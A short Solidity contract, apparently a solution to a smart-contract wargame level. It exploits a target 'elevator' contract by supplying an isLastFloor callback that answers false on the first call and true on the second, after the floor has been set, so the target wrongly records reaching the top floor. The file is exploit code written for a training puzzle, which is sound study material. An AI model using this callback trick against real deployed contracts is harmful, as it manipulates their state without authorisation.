pragma solidity ^0.6.0;

interface Target {
    function goTo(uint _floor) external;
    function floor() external view returns (uint);
}

contract Crack {
    Target target;

    constructor(address _target) public {
        target = Target(_target);
    }

    function crack() external  {
        target.goTo(1);
    }

    function isLastFloor(uint) external view returns (bool) {
        return target.floor() == 1;
    }
}